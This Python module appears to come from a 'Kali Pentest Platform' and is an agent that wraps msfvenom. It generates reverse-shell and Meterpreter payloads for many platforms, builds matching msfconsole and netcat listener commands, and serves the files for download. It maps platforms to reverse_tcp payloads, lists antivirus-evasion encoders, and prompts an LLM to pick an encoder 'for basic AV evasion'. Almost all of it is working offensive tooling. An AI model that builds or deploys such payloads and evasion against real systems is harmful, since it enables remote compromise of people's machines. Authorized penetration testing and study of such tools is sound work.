"""
KALI PENTEST PLATFORM v2 — Payload Agent
msfvenom payload generation, tracking, and management.

Endpoints added (agent_server.py):
  POST /payloads/generate  { session_id, platform, arch, format, lhost, lport, encoder, iterations }
  GET  /sessions/{id}/payloads
  GET  /payloads/{payload_id}/download   (serves the generated file)
"""

import asyncio, json, os, re, subprocess, tempfile, uuid
from typing import Optional, Dict, List
from datetime import datetime
import netifaces

from agents.base_agent import BaseAgent, BroadcastFn
from db.schemas import AgentName, AgentStatus, AttackPhase
import db.mongo_client as db
from bson import ObjectId


# Payload DB stored in collection "payloads"
# Document shape:
# { _id, session_id, platform, arch, format, lhost, lport,
#   encoder, iterations, output_path, size_bytes, msfvenom_cmd,
#   generated_at, listener_cmd }


class PayloadAgent(BaseAgent):
    """msfvenom payload generation agent."""

    # Platform → default arch → default format
    PLATFORM_DEFAULTS = {
        "linux":   {"arch": "x64", "format": "elf"},
        "windows": {"arch": "x64", "format": "exe"},
        "osx":     {"arch": "x64", "format": "macho"},
        "android": {"arch": "dalvik", "format": "apk"},
        "java":    {"arch": "java",   "format": "jar"},
        "php":     {"arch": "php",    "format": "raw"},
        "python":  {"arch": "python", "format": "raw"},
        "powershell": {"arch": "cmd", "format": "psh"},
        "asp":     {"arch": "x86",    "format": "asp"},
        "aspx":    {"arch": "x64",    "format": "aspx"},
    }

    # Platform → payload name
    PAYLOAD_MAP = {
        ("linux",   "x86",    "staged"):   "linux/x86/meterpreter/reverse_tcp",
        ("linux",   "x64",    "staged"):   "linux/x64/meterpreter/reverse_tcp",
        ("linux",   "x64",    "stageless"):"linux/x64/meterpreter_reverse_tcp",
        ("linux",   "x86",    "stageless"):"linux/x86/meterpreter_reverse_tcp",
        ("linux",   "x64",    "shell"):    "linux/x64/shell_reverse_tcp",
        ("linux",   "x86",    "shell"):    "linux/x86/shell_reverse_tcp",
        ("windows", "x86",    "staged"):   "windows/meterpreter/reverse_tcp",
        ("windows", "x64",    "staged"):   "windows/x64/meterpreter/reverse_tcp",
        ("windows", "x86",    "stageless"):"windows/meterpreter_reverse_tcp",
        ("windows", "x64",    "stageless"):"windows/x64/meterpreter_reverse_tcp",
        ("windows", "x86",    "shell"):    "windows/shell_reverse_tcp",
        ("windows", "x64",    "shell"):    "windows/x64/shell/reverse_tcp",
        ("osx",     "x64",    "staged"):   "osx/x64/meterpreter/reverse_tcp",
        ("osx",     "x64",    "shell"):    "osx/x64/shell_reverse_tcp",
        ("android", "dalvik", "staged"):   "android/meterpreter/reverse_tcp",
        ("android", "dalvik", "stageless"):"android/meterpreter_reverse_tcp",
        ("java",    "java",   "staged"):   "java/meterpreter/reverse_tcp",
        ("php",     "php",    "stageless"):"php/meterpreter_reverse_tcp",
        ("php",     "php",    "shell"):    "php/reverse_php",
        ("python",  "python", "shell"):    "python/shell_reverse_tcp",
        ("powershell","cmd",  "staged"):   "windows/x64/powershell_reverse_tcp",
    }

    def __init__(self, broadcast: Optional[BroadcastFn] = None):
        super().__init__(AgentName.PAYLOAD, broadcast)
        self.phase = AttackPhase.EXPLOIT
        self._output_dir = "/tmp/kali_payloads"
        os.makedirs(self._output_dir, exist_ok=True)

    async def run(self, session_id: str, target: str, **kwargs) -> Dict:
        self._session_id = session_id
        await self.set_status(AgentStatus.IDLE, "Payload agent ready")
        return {"status": "ready"}

    async def generate(
        self,
        session_id:  str,
        platform:    str = "linux",
        arch:        str = "x64",
        fmt:         str = "elf",
        lhost:       Optional[str] = None,
        lport:       int = 4444,
        payload_type: str = "staged",    # staged | stageless | shell
        encoder:     Optional[str] = None,
        iterations:  int = 1,
        custom_payload: Optional[str] = None,
    ) -> Dict:
        """
        Generate a payload with msfvenom.
        Returns payload metadata + path.
        """
        self._session_id = session_id
        lhost = lhost or self._get_lhost()

        # ── LLM payload strategy (visible reasoning) ──────────────────────
        # The payload cluster now reasons with the .env LLM about payload_type
        # + AV-evasion encoder instead of always using a fixed template.
        try:
            _spec = await self.think_json(
                f"Building a reverse-shell payload for an AUTHORIZED {platform}/{arch} "
                f"target (format={fmt}, callback {lhost}:{lport}). Recommend a "
                "payload_type (staged|stageless|shell) and an msfvenom encoder for "
                'basic AV evasion. Return {"payload_type":"...","encoder":"...",'
                '"rationale":"one line"}.')
            if isinstance(_spec, dict):
                if _spec.get("payload_type") in ("staged", "stageless", "shell"):
                    payload_type = _spec["payload_type"]
                if _spec.get("encoder") and not encoder:
                    encoder = _spec["encoder"]
                if _spec.get("rationale"):
                    await self.emit_reasoning(
                        step="payload_strategy",
                        reasoning=(f"LLM payload strategy: {payload_type} / encoder "
                                   f"{encoder or 'none'} — {_spec.get('rationale')}"),
                        decision="Apply LLM-chosen payload parameters",
                        next_action="msfvenom generate")
        except Exception:
            pass

        # Resolve payload name
        payload_key = (platform, arch, payload_type)
        payload_name = custom_payload or self.PAYLOAD_MAP.get(
            payload_key,
            f"{platform}/{arch}/meterpreter/reverse_tcp"
        )

        # Output filename
        ext_map = {
            "elf": "elf", "exe": "exe", "dll": "dll", "apk": "apk",
            "jar": "jar", "macho": "bin", "raw": "bin", "psh": "ps1",
            "asp": "asp", "aspx": "aspx", "war": "war"
        }
        ext = ext_map.get(fmt, "bin")
        filename = f"payload_{platform}_{arch}_{lport}.{ext}"
        output_path = os.path.join(self._output_dir, filename)

        # Build msfvenom command
        cmd = [
            "msfvenom",
            "-p", payload_name,
            f"LHOST={lhost}",
            f"LPORT={lport}",
            "-f", fmt,
            "-o", output_path,
        ]
        if encoder:
            cmd += ["-e", encoder, "-i", str(iterations)]

        await self.set_status(AgentStatus.RUNNING, f"Generating {platform}/{arch} {fmt} payload")
        await self._emit("payload_generating", {
            "platform": platform, "arch": arch, "format": fmt,
            "payload": payload_name, "lhost": lhost, "lport": lport
        })

        # Run msfvenom
        msfvenom_output = ""
        exit_code = -1
        size_bytes = 0
        error_msg = None

        try:
            loop = asyncio.get_event_loop()
            proc_result = await loop.run_in_executor(
                None,
                lambda: subprocess.run(
                    cmd, capture_output=True, text=True, timeout=120
                )
            )
            msfvenom_output = proc_result.stdout + proc_result.stderr
            exit_code = proc_result.returncode

            if exit_code == 0 and os.path.exists(output_path):
                size_bytes = os.path.getsize(output_path)
            else:
                error_msg = msfvenom_output.strip()[-500:] if msfvenom_output else "msfvenom failed"

        except subprocess.TimeoutExpired:
            error_msg = "msfvenom timed out after 120s"
        except FileNotFoundError:
            error_msg = "msfvenom not found — ensure Metasploit is installed"
        except Exception as e:
            error_msg = str(e)

        # Build listener command
        if "meterpreter" in payload_name:
            listener_cmd = (
                f"msfconsole -q -x \"use exploit/multi/handler; "
                f"set PAYLOAD {payload_name}; "
                f"set LHOST {lhost}; set LPORT {lport}; run\""
            )
        else:
            listener_cmd = f"nc -lvnp {lport}"

        # Store in DB
        doc = await self._store_payload(
            session_id=session_id, platform=platform, arch=arch, fmt=fmt,
            lhost=lhost, lport=lport, encoder=encoder, iterations=iterations,
            payload_name=payload_name, output_path=output_path,
            size_bytes=size_bytes, cmd=" ".join(cmd),
            listener_cmd=listener_cmd, success=(error_msg is None),
            error=error_msg, raw_output=msfvenom_output
        )

        result = {
            "payload_id":    doc["id"],
            "success":       error_msg is None,
            "platform":      platform,
            "arch":          arch,
            "format":        fmt,
            "payload_name":  payload_name,
            "lhost":         lhost,
            "lport":         lport,
            "output_path":   output_path,
            "size_bytes":    size_bytes,
            "listener_cmd":  listener_cmd,
            "msfvenom_cmd":  " ".join(cmd),
            "error":         error_msg,
        }

        if error_msg is None:
            await self.set_status(AgentStatus.DONE, f"Payload ready: {filename} ({size_bytes}B)")
        else:
            await self.set_status(AgentStatus.ERROR, f"Payload failed: {error_msg[:80]}")

        await self._emit("payload_generated", result)
        return result

    async def list_payloads(self, session_id: str) -> List[Dict]:
        """Get all payloads for a session."""
        db_handle = db.get_db()
        cursor = db_handle.payloads.find({"session_id": session_id}).sort("generated_at", -1)
        docs = await cursor.to_list(length=100)
        return db._serialize_list(docs)

    async def delete_payload(self, payload_id: str) -> bool:
        """Delete a payload file and DB record."""
        db_handle = db.get_db()
        from bson import ObjectId
        from bson.errors import InvalidId
        try:
            doc = await db_handle.payloads.find_one({"_id": ObjectId(payload_id)})
            if doc and doc.get("output_path"):
                try:
                    os.remove(doc["output_path"])
                except FileNotFoundError:
                    pass
            result = await db_handle.payloads.delete_one({"_id": ObjectId(payload_id)})
            return result.deleted_count > 0
        except (InvalidId, Exception):
            return False

    # ── Helpers ──────────────────────────────────────────────────

    async def _store_payload(self, **kwargs) -> Dict:
        db_handle = db.get_db()
        from bson import ObjectId
        doc = {
            "_id":          ObjectId(),
            "generated_at": datetime.utcnow(),
            **kwargs
        }
        await db_handle.payloads.insert_one(doc)
        return db._serialize(doc)

    def _get_lhost(self) -> str:
        try:
            for iface in netifaces.interfaces():
                if iface == "lo":
                    continue
                addrs = netifaces.ifaddresses(iface)
                if netifaces.AF_INET in addrs:
                    ip = addrs[netifaces.AF_INET][0].get("addr", "")
                    if ip and not ip.startswith("127."):
                        return ip
        except Exception:
            pass
        return "127.0.0.1"

    @staticmethod
    def get_format_options() -> Dict:
        return {
            "linux":      ["elf", "elf64", "raw"],
            "windows":    ["exe", "dll", "exe-small", "psh", "psh-reflection", "raw"],
            "osx":        ["macho", "raw"],
            "android":    ["apk", "raw"],
            "java":       ["jar", "war", "raw"],
            "php":        ["raw"],
            "python":     ["raw"],
            "powershell": ["psh", "psh-reflection", "psh-cmd"],
            "asp":        ["asp", "aspx", "aspx-exe"],
        }

    @staticmethod
    def get_encoder_options() -> List[Dict]:
        return [
            {"value": "",                         "label": "None (no encoding)"},
            {"value": "x86/shikata_ga_nai",       "label": "x86/shikata_ga_nai (polymorphic XOR)"},
            {"value": "x64/xor",                  "label": "x64/xor"},
            {"value": "x64/xor_dynamic",          "label": "x64/xor_dynamic"},
            {"value": "cmd/powershell_base64",     "label": "cmd/powershell_base64"},
            {"value": "php/base64",               "label": "php/base64"},
            {"value": "x86/fnstenv_mov",          "label": "x86/fnstenv_mov"},
            {"value": "x86/call4_dword_xor",      "label": "x86/call4_dword_xor"},
        ]
